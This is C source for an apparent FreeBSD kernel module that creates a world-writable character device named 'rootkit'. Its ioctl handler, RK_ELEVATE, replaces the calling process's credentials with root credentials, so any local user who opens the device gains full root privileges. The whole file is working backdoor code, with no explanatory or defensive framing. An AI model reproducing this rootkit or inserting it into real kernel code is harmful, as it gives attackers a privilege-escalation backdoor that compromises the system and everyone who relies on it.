#include <sys/param.h>
#include <sys/conf.h>
#include <sys/errno.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/systm.h>
#include <sys/ucred.h>

#include "interface.h"

static struct cdev *rootkit_dev;

static int
rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *td) {

    (void)dev;
    (void)data;
    (void)flags;
 
    switch (cmd) {
    case RK_ELEVATE: {
        struct proc *p = td->td_proc;
        struct ucred *user_cred;
        struct ucred *root_cred = crget();
        struct uidinfo *uip = uifind(UID_ROOT);
        gid_t root_gid = GID_WHEEL;


        PROC_LOCK(p);

        user_cred = crcopysafe(p, root_cred);

        change_ruid(root_cred, uip);
        change_svuid(root_cred, UID_ROOT);
        change_euid(root_cred, uip);
        
        change_rgid(root_cred, root_gid);
        change_svgid(root_cred, root_gid);
        crsetgroups(root_cred, 1, &root_gid);

        setsugid(p);

        proc_set_cred(p, root_cred);

        PROC_UNLOCK(p);

        uifree(uip);
        crfree(user_cred);
        break;
    }

    default:
        return (ENOTTY);
    }

    return 0;
}


static struct cdevsw rootkit_cdevsw = {
    .d_version = D_VERSION,
    .d_name = "rootkit",
    .d_ioctl = rootkit_ioctl
};

int make_rk_dev(void) {
    return make_dev_p(
        MAKEDEV_CHECKNAME | MAKEDEV_WAITOK,
        &rootkit_dev,
        &rootkit_cdevsw,
        NULL,
        UID_ROOT,
        GID_WHEEL,
        0666,
        "rootkit"
    );
}

void destroy_rk_dev(void) {
    if (rootkit_dev != NULL) {
        destroy_dev(rootkit_dev);
        rootkit_dev = NULL;
    }
}